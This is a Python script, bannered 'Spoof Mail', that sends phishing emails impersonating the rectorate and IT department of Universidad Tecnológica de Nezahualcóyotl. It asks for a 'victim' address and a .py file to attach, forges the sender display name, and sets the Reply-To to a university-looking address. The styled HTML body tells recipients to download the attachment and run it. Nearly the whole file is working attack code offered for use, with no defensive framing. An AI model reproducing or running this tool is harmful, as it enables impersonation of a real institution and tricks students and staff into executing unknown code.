#!/usr/bin/env python3
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os

def show_banner():
    print("-------------------------------------------")
    print("              Spoof Mail                  ")
    print("-------------------------------------------")
    print("                )                      *     ")
    print("  *   )      ( /(    *   )     (     (  `    ")
    print("` )  /(   (  )\\()) ` )  /((    )\\    )\\))(   ")
    print(" ( )(_))  )\\((_)\\   ( )(_))\\((((_)( ((_)()\\  ")
    print("(_(_())_ ((_)_((_) (_(_()|(_))\\ _ )\\(_()((_) ")
    print("|_   _| | | \\ \\/ / |_   _| __(_)_\\(_)  \\/  |  ")
    print("  | | | |_| |>  <    | | | _| / _ \\ | |\\/| | ")
    print("  |_|  \\___//_/\\_\\   |_| |___/_/ \\_\\|_|  |_| ")
    print("")
    print("              a8888b.")
    print("             d888888b.")
    print("             8P\"YP\"Y88")
    print("             8|o||o|88")
    print("             8'    .88")
    print("             8`._.' Y8.")
    print("            d/      `8b.")
    print("          .dP   .     Y8b.")
    print("         d8:'   \"   `::88b.")
    print("        d8\"           `Y88b")
    print("       :8P     '       :888")
    print("        8a.    :      _a88P")
    print("      ._/\"Yaa_ :    .| 88P|")
    print(" jgs  \\    YP\"      `| 8P  `.")
    print(" a:f  /     \\._____.d|    .'")
    print("      `--..__)888888P`._.'")
    print("")

def send_utn_spoofed_email():
    show_banner()
    
    # CONFIGURACIÓN DE CUENTA REAL
    gmail_user = "tu mail"
    gmail_password = "tu contraseña"
    
    # CONFIGURACIÓN DE SUPLANTACIÓN
    display_name = "Rectoría UTN - Departamento Académico"
    spoofed_email = "rectoria@utnezahualcoyotl.edu.mx"
    target_email = input("Ingresa el correo de la víctima: ")
    
    # CONFIGURACIÓN DE ARCHIVO ADJUNTO
    attachment_path = input("Ingresa la ruta del archivo .py a adjuntar: ")
    
    # CONTENIDO DEL CORREO
    subject = "Nuevo Calendario Académico 2025 - UTN"
    
    # Contenido HTML
    html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <style>
        body {{
            font-family: Arial, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
        }}
        .header {{
            background: #8a2036;
            color: white;
            padding: 20px;
            text-align: center;
            border-radius: 8px 8px 0 0;
        }}
        .content {{
            background: white;
            padding: 25px;
            border: 1px solid #ddd;
            border-radius: 0 0 8px 8px;
        }}
        .file-info {{
            background: #e8f4fd;
            padding: 15px;
            border-radius: 6px;
            margin: 15px 0;
        }}
        .instructions {{
            background: #f8f9fa;
            padding: 15px;
            border-radius: 6px;
            margin: 15px 0;
        }}
        .footer {{
            text-align: center;
            margin-top: 20px;
            padding: 15px;
            background: #f5f5f5;
            font-size: 12px;
            color: #666;
            border-radius: 6px;
        }}
    </style>
</head>
<body>
    <div class="header">
        <h2>UNIVERSIDAD TECNOLÓGICA DE NEZAHUALCÓYOTL</h2>
        <p>Departamento de Sistemas Informáticos</p>
    </div>
    
    <div class="content">
        <h3>Material de Soporte Técnico</h3>
        
        <p>Estimado usuario,</p>
        
        <p>Se adjunta el material solicitado para el mantenimiento del sistema académico.</p>
        
        <div class="file-info">
            <h4>Archivo Adjunto:</h4>
            <p><strong>Nombre:</strong> {os.path.basename(attachment_path)}</p>
            <p><strong>Tamaño:</strong> {os.path.getsize(attachment_path) if os.path.exists(attachment_path) else 'N/A'} bytes</p>
        </div>
        
        <div class="instructions">
            <h4>Instrucciones de Uso:</h4>
            <ol>
                <li>Descargue el archivo adjunto</li>
                <li>Guarde en una ubicación segura</li>
                <li>Ejecute según las indicaciones del técnico</li>
            </ol>
        </div>
        
        <p>Para cualquier consulta técnica, contacte al departamento de sistemas.</p>
        
        <p>Atentamente,<br>
        <strong>Departamento de Sistemas</strong><br>
        Universidad Tecnológica de Nezahualcóyotl</p>
    </div>
    
    <div class="footer">
        <p>Este es un mensaje automático. No responder a este correo.<br>
        UTN © 2025 - Todos los derechos reservados.</p>
    </div>
</body>
</html>
"""

    # CONSTRUCCIÓN DEL EMAIL
    msg = MIMEMultipart('alternative')
    
    msg['From'] = f'"{display_name}" <{gmail_user}>'
    msg['To'] = target_email
    msg['Subject'] = subject
    msg['Reply-To'] = spoofed_email
    
    # Adjuntar contenido HTML
    msg.attach(MIMEText(html_content, 'html'))
    
    # ADJUNTAR ARCHIVO
    try:
        with open(attachment_path, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
        
        encoders.encode_base64(part)
        part.add_header(
            'Content-Disposition',
            f'attachment; filename= {os.path.basename(attachment_path)}',
        )
        msg.attach(part)
        print(f"Archivo adjuntado: {attachment_path}")
        
    except Exception as e:
        print(f"Error al adjuntar archivo: {e}")
        return

    # ENVÍO DEL CORREO
    try:
        print("Iniciando envío...")
        
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(gmail_user, gmail_password)
        server.sendmail(gmail_user, target_email, msg.as_string())
        server.quit()
            
        print("Correo enviado exitosamente")
        print(f"Remitente visual: {display_name}")
        print(f"Reply-To: {spoofed_email}")
        print(f"Objetivo: {target_email}")
        print(f"Asunto: {subject}")
        print(f"Adjunto: {attachment_path}")
        
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    send_utn_spoofed_email()

